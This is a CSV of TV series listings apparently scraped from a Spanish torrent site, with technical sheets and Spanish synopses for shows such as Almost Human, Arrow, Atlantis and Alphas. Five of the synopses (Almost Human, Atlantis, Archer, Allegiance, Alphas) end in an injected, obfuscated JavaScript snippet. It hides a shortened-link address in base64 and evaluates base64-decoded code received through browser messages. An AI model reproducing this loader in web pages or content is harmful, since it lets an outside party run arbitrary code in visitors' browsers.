Series main_page_url,Series name,Ficha tecnica,Resumen
https://www.subtorrents1.com/series/almost-human/,Almost Human,"
                       Título Original: Almost Human
Creador: J. H. Wyman
Producción Ejecutiva: J. H. Wyman, J. J. Abrams y Bryan Burk
Estudio: Warner Bros. Television
Género: Comedia
Temporada: 1ª temporada
Episodios: 13
Fecha de estreno: Noviembre de 2013
Lugar de rodaje: Vancouver
Distribución: Warner
Horario de emisión: Lunes 8.00 p.m.						","
Descripcion
Almost Human es la nueva producción de J.J. Abrams (Revolution, Perdidos) y J.H. Wyman (Fringe, The Mexican), una trepidante serie poliaca ambientada 35 años en el futuro, en una época en la que los policías tienen como compañeros a androides de aspecto completamente humano y altamente volucionados. En ese ambiente se forjará una extraña e inusual alianza entre un problemático policía, mitad máquina debido a las prótesis que lleva incrustadas en su cuerpo, y un robot medio humano, al que se le reconocen sentimientos que no debería tener. Ambos lucharán juntos contra el crimen en un mundo futurista de alberga desconocidos y terribles peligros.
Es el año 2048. La Tierra es completamente diferente a la que disfrutamos en estos momentos. Lo sabe bien John Kennex (Karl Urban, El señor de los anilos), un agente que sobrevivió a uno de los ataques más catastróficos nunca hechos contra el departamento policial. Después de despertar de un coma de 17 meses, no puede recordar mucho de lo ocurrido, excepto que su compañero fue asesinado, que su novia le dejó después del suceso y que perdió una de sus piernas y ahora cuenta con una prótesis sofisticada y sintética. 
(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/arrow/,Arrow,"
                       Título Original: Arrow
Creador: Greg Berlanti, Marc Guggenheim y Andrew Kreisberg
Producción Ejecutiva: Greg Berlanti, Marc Guggenheim, David Nutter y Andrew Kreisberg
Estudio: Warner Bros. Television
Género: Acción
Temporada: 1ª 
Episodios: 22
Fecha de estreno: 10 de octubre de 2012
Lugar de rodaje: Vancouver
Distribución: Warner
Horario de emisión: Miércoles 8.00 p.m.

Reparto:
Stephen Amell ... Oliver Queen
Colin Donnell ... Tommy Merlyn
Katie Cassidy ... Laurel Lance
David Ramsey ... John Diggle
Willa Holland ... Thea Queen
Jamey Sheridan ... Robert Queen
Susanna Thompson ... Moira Queen
Paul Blackthorne ... Quentin Lance						","
Descripcion
Basada en los personajes que aparecen en los comics y novelas gráficas publicadas por DC Comics, Arrow es una nueva reinterpretación del legendario Flecha Verde, ofreciendo una versión oscura y pseudo-cinematográfica a la historia de Oliver Queen, un playboy billonario. Desaparecido y dado por muerto durante años, el mundo se sorprende cuando Oliver es descubierto vivo en una isla remota. Pero su aislamiento de la sociedad que conocía le ha hecho cambiar su personalidad y sus prioridades. Decidido a ocultar la verdad sobre el hombre en el que se ha convertido, un superhéroe que lucha contra las injusticias, tratará de compensar las acciones que protagonizó cuando tan sólo era un adolescente.
Conoce a Oliver Queen (Stephen Amell, Crónicas vampíricas). Es atractivo, es inteligente y un billonario. Pero su suerte parece cambiar cuando desaparece durante un accidete marítimo. Después de un violento naufragio, Oliver Queen es dado por muerto. Pero durante cinco años ha estado peleando por sobrevivir en una remota isla del Pacífico. Tras descubrir que sigue vivo, y una vez rescatado, regresa a su casa en Starling City, en donde es bien recibido por su devota madre, Moira (Susanna Thompson, Una vez más), su adorable hermana Thea (Willa Holland, O.C.), y su mejor amigo, Tommy (Colin Donell, Pan Am). Pero todos ellos descubrirán que el Oliver al que despidieron es muy diferente al que ha regresado.
"
https://www.subtorrents1.com/series/atlantis/,Atlantis,"
                       Título original: Atlantis
Año: 2013
Duración: 45 min.
País Reino: Unido
Director: Howard Overman (Creator),  Alice Troughton,  Justin Molotnikov
Guión: Howard Overman
Productora: Urban Myth Films / BBC One
Género: Aventuras. Fantástico 
Temporada: 1
Capítulos: 13
Reparto:
Robert Emms,  
Mark Addy,  
Juliet Stevenson,  
Sarah Parish,  
Jack Donnelly,  
Jemima Rooper,  
Oliver Walker
","
Descripcion
Cuando Jason comienza a buscar a su padre, él nunca podría haber previsto a donde le llevaría su viaje… Lejos de casa y desesperados en busca de respuestas, Jason se lava en la orilla de una tierra antigua. Un lugar misterioso, un mundo donde el toro salta, de diosas con pelo de serpiente y palacios tan grandes que se dijo que fueron construidoss por gigantes – esta es la ciudad de la Atlantis. Pero bajo la superficie de este lugar atractivo se oculta un pasado oscuro que se cuece a fuego lento, una complicada red de la traición y de engaño, con la que el propio Jason parece inexplicablemente ligado.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/ancient-aliens/,Ancient Aliens,"
                       Título original: Ancient Aliens
Año: 2009
País: Estados Unidos
Director: Kevin Burns, David Silver
Guión: Richard Monahan, Kody DèShaupe, Kaylan Eggert
Música: Randy Jones
Productora: Prometheus Entertainment
Género: Documental. Ciencia ficción | Extraterrestres


Robert Clotworthy ... Narrador						","
Descripcion
Alienígenas Ancestrales, (Ancient Aliens) serie documental elaborada por ""The History Channel"" sobre paleoastronáutica, más conocida como la teoría de los astronautas en la antigüedad, destaca cómo las antiguas civilizaciones de entonces dejaron reflejado manifiestamente en sus culturas e historia la presencia de visitantes procedentes de las estrellas.
La existencia de la vida extraterrestre ha sido centro de controversia a lo largo de la historia. De hecho, algunas teorías aseguran que los extraterrestres han interactuado con los habitantes de la Tierra en el transcurso de los siglos y han cambiado el curso de la historia humana.
Alienígenas Ancestrales explora 75 millones de años de pruebas contundentes sobre la posible vida de los extraterrestres en el planeta Tierra, abarcando desde la era de los dinosaurios hasta fechas que nos acercan al presente. Principalmente basada en el trabajo del escritor suizo Erich Von Däniken, acompañan a éste, una nueva fuente de investigadores y científicos interesados en divulgar esa parte de nuestra extensa historia que aún sigue oculta.
"
https://www.subtorrents1.com/series/archer/,Archer,"
                       TÍTULO ORIGINAL: Archer
AÑO: 2009 	
PAÍS: Estados Unidos
DIRECTOR: Adam Reed (Creator)
GUIÓN: Adam Reed
MÚSICA: Michael Kohler
FOTOGRAFÍA: Animation
REPARTO: Animation
PRODUCTORA: FX Network / Floyd County Productions
GÉNERO: Serie de TV. Animación. Intriga | Espionaje. Parodia. Animación para adultos
SINOPSIS 	Serie de TV (2009-Actualidad). 10 episodios. Parodia animada de las películas y series sobre espías. 						","
Descripcion
SINOPSIS:
Serie de TV (2009-Actualidad). 10 episodios. Parodia animada de las películas y series sobre espías. (function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/animals/,Animals,"
                       AÑO DE PRODUCCIÓN: 2017

GÉNERO: COMEDIA/

DURACIÓN: 25

CENSURA: C						","
Descripcion
La peculiar e irreverente comedia regresa con las historias de amor, amistad y problemas existenciales que viven los animales con pensamientos humanos en las calles de Nueva York. En esta temporada, moscas, cucarachas, palomas, ardillas y gatos se enfrentan a distintas situaciones dentro de una agitada sociedad.
"
https://www.subtorrents1.com/series/allegiance/,Allegiance,"
                       Título original: Allegiance
Año: 2015
País: Estados Unidos
Director: George Nolfi
Guión: George Nolfi
Fotografía: Teodoro Maniaci
Género: Intriga Drama Espionaje
Productora: NBC

Capítulos: 13


Reparto:

Alexandra Peters ... Sarah O'Connor
Annie Ilonzeh ... Julia Marcus
Gavin Stenhouse ... Alex O'Connor
Hope Davis ... Katya O'Connor
Kenneth Choi ... Sam Luttrell
Margarita Levieva ... Natalie O'Connor
Morgan Spector ... Victor Dobrynin
Scott Cohen ... Mark O'Connor						","
Descripcion
'Allegiance' se centra en la figura de Alex O'Connor (Gavin Stenhouse), un joven idealista y agente de la CIA especializado en matería rusa. Aunque su vida parece seguir su cauce habitual, todo cambiará cuando conozca un secreto que cambiará la idealizada imagen que tenía de su familia. Sus padres, Mark (Scott Cohen) y Katya (Hope Davis), son espías rusos encubiertos en EE.UU que fueron desactivados hace décadas. No obstante, una operación terrorista contra los Estados Unidos los devolverá de nuevo a sus puestos y a la realidad.
Años atrás, Katya, de origen ruso, tuvo que reclutar a un empresario estadounidense llamado Mark O'Connor por orden de la KGB. El amor surgió rápidamente y estos les llevo a trazar un acuerdo: mientras Katya siga siendo una ventaja para Rusia en un futuro, se les permitiría a ambos mudarse a EE.UU y casarse. Esto dio lugar a una próspera vida que hizo que se olvidaran completamente de su verdadero propósito. Los últimos acontecimientos les pondrá en una difícil situación por la que tendrán que tomar una clara decisión: traicionar a su país o traicionar a su familia.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/alphas/,Alphas,"
                       Título Original: Alphas
Creador: Michael Karnow y Zak Penn
Producción Ejecutiva: Gail Berman, Gene Stein, Ira Steven Behr, Jack Bender, Lloyd Braun y Zak Penn
Estudio: Universal Cable Productions
Género: Ciencia Ficción
Temporada: 2ª
Episodios: 13
Fecha de estreno: 11 de julio de 2011
Lugar de rodaje: Toronto
Audiencia temp. pasada: 1,96 millones de espectadores
Horario de emisión Lunes 10.00 p.m.

Reparto:
David Strathairn ... Lee Rosen
Laura Mennell ... Nina Theroux
Malik Yoba ... Bill Harken
Ryan Cartwright ... Gary Bell
Warren Christie ... Christian Hicks
Azita Ghanizada ... Rachel Myers						","
Descripcion
SyFy entra en el mundo de los superhéroes con Alphas, una serie que sigue a un equipo de ciudadanos normales cuyas anomalías cerebrales les proporcionan extraordinarias habilidades mentales y físicas. Tomando la ley con sus propias manos, esta unidad liderada por el doctor Lee Rosen, investiga casos que sugieren actividad de otros Alfas y que la CIA, el FBI o el Pentágono no son capaces, o no están dispuestos a resolver. Mientras trabajan contrarreloj para investigar esta nueva oleada criminal, estos dotados individuos deben equilibrar sus extravagantes personalidades y sus diferentes orígenes con sus no siempre visibles poderes, con el objetivo de resolver crímenes, evitar atentados, capturar a los enemigos y salvar el mundo.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/angie-tribeca/,Angie Tribeca,"
                       Título original: Angie Tribeca
Año: 2016
País: Estados Unidos
Director: Steve Carell, Martha Coolidge, Richie Keen, Jon Poll, Matt Sohn
Guión: Nancy Carell, Steve Carell, Marisa Pinson, Alex J. Reid, Ava Tramer
Productora: Carousel Television
Género: Comedia

Capítulos: 10


Reparto:

Rashida Jones ... Angie Tribeca
Jere Burns ... Chet Atkins
Deon Cole ... DJ Tanner
Hayes MacArthur ... Jay Geils						","
Descripcion
Angie Tribeca (Rashida Jones) es una agente de la policía que lleva en la Unidad de Crímenes de Los Angeles más de 10 años. Este grupo de detectives investigan un crimen y no descansan hasta que se haya hecho justicia…más o menos.

"
https://www.subtorrents1.com/series/ambassadors/,Ambassadors,"
                       Título original
    Ambassadors
Año
    2013
Duración
    60 min.
País
    Reino Unido
Dirección
    Jeremy Webb
Guion
    Rupert Walters, James Wood
Reparto
    David Mitchell, Robert Webb, Susan Lynch, Amara Karan, Shivani Ghai, Keeley Hawes, Andy Lucas, Oliver Dimsdale, Natalia Tena, Debbie Chazen, George Lasha, Sevan Stephan, Velibor Topic, Yigal Naor, Matthew Macfadyen, Lachele Carl, James Doherty, Jenny Galloway
Productora
    BBC Comedy / Big Talk Productions
Género
    Comedia | Miniserie de TV						","
Descripcion
Miniserie de TV. 3 episodios. La serie está ambientada en la ficticia República de Asia Central de Tazbekistán, donde el recién llegado embajador británico Keith Davies se fija la tarea de tratar de asegurar un contrato de compra de helicópteros por 2 mil millones de libras para el Reino Unido.
"
https://www.subtorrents1.com/series/american-playboy-the-hugh-hefner-story/,American Playboy The Hugh Hefner Story,"
                       Título original
    American Playboy: The Hugh Hefner Story (TV Series) 
Año
    2017
Duración
    42 min.
País
    Estados Unidos Estados Unidos
Director
    Richard Lopez 
Guion
    Brian Burstein, Stephen David, Tim W. Kelly, Jeremiah Murphy, Peter Sherman
Fotografía
    Milton Kam
Reparto
    Documentary, Matt Whelan, Emmett Skilton, Adam Jonas Segaller, Ian Bell, Chelsie Preston Crayford, Victoria Abbott, Matt Arbuckle, Ella Becroft, Rowan Bettjeman, Fraser Brown, Alistair Browning, Joy Buckle, Shara Connolly, Campbell Cooley, Elizabeth Dowden, Coen Falke 
Productora
    Alta Loma Entertainment / Stephen David Entertainment. Distribuída por Amazon Studios
Género
    Serie de TV. Documental. Drama | Biográfico 						","
Descripcion
American Playboy: The Hugh Hefner Story está ambientada en la época de posguerra en Estados Unidos, concretamente en 1953, año en que se lanza al mercado la revista Playboy. La serie narra la historia su creador, Hugh Hefner, y la evolución de esta publicación a lo largo de 60 años. Mientras Hefner creaba esta controvertida revista, se convirtió en un defensor de la justicia social, hecho que le puso en el punto de mira del movimiento conservador. Casi sin darse cuenta, Hefner pasó a ser un gran defensor de los derechos civiles, la libertad de expresión, los derechos de los homosexuales y la libertad sexual.
La historia de Hugh Hefner está contada con las propias palabras de quien vivió esa historia, ya que Hefner, a sus 90 años de edad, ha participado en el desarrollo, la producción y el guion de esta serie que está protagonizada por Matt Whelan (Go Girls) en el papel de Hugh Hefner, Ian Bell (The Making of the Mob: New York) es Art Paul, Adam Jonas Segaller (NASCAR: The Rise of Ame) es A.C. Spectorsky y Emmett Skilton (The Almighty Johnsons) da vida a Victor Lownes.
La ficción original de Amazon está producida por Stephen David  Entertainment (Sons of Liberty) y productora de Playboy Enterprises: Alta Loma Entertainment. Richard Lopez (I Sell the Dead) es el director de esta serie que cuenta con un equipo de guionistas formado por Jeremiah Murphy, Peter Sherman y Brian Burstein. Los productores ejecutivos son el propio David, Peter Jaysen, Dick Rosenzweig, Shirley Escott y Tim Kelly. 
"
